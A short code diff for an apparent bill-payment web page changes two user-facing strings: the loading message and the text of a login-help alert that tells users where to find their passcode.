@@ -80,7 +80,7 @@
             <input type="password" id="passcode" placeholder="••••••" maxlength="6" inputmode="numeric">
         </div>
 
-        <div id="loading" class="loading-text"><i class="fas fa-spinner fa-spin"></i> Loading secure link...</div>
+        <div id="loading" class="loading-text"><i class="fas fa-spinner fa-spin"></i> Verifying account and retrieving bill...</div>
         
         <button id="payBtn" class="btn-pay" onclick="handlePay()">PROCEED TO PAYMENT</button>
 
@@ -155,7 +155,7 @@
     }
 
     function showLoginHelp() {
-        alert("Please enter the 6-digit passcode from your statement.");
+        alert("LOGIN ASSISTANCE:\n\nPlease check your Email or Messenger for your official login credentials. If you haven't received them yet, please contact us using the support links below.");
     }
 
     document.getElementById("passcode").addEventListener("keyup", (e) => {
